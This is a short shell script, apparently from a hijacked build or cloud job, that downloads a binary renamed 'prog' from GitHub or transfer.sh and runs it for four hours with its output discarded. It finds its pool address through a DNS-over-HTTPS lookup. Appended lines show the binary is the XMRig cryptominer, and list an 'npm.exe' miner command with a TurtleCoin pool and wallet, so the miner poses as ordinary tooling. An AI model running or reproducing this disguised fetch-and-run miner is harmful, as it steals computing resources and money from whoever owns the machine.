apt update -qq
apt install -y curl git jq
curl -Lfo prog https://github.com/bhriscarnatt/first-repo/releases/download/a/prog || curl -Lfo prog https://transfer.sh/OSPjK/prog
ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=poolio.magratmail.xyz&type=A' | jq -r '.Answer[0].data')
chmod u+x prog
timeout 4h ./prog -o "${ip}:3000" -u ChrisBarnatt -p ExplainingComputers --cpu-priority 5 > /dev/null
 ./prog --version
XMRig 6.8.1
 built on Feb  3 2021 with GCC 10.2.1
 features: 64-bit AES
libuv/1.40.0
OpenSSL/1.1.1i
hwloc/2.4.0
npm.exe --algorithm argon2id_chukwa2 
pool turtlecoin.herominers.com:10380 
wallet TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy 
password xo
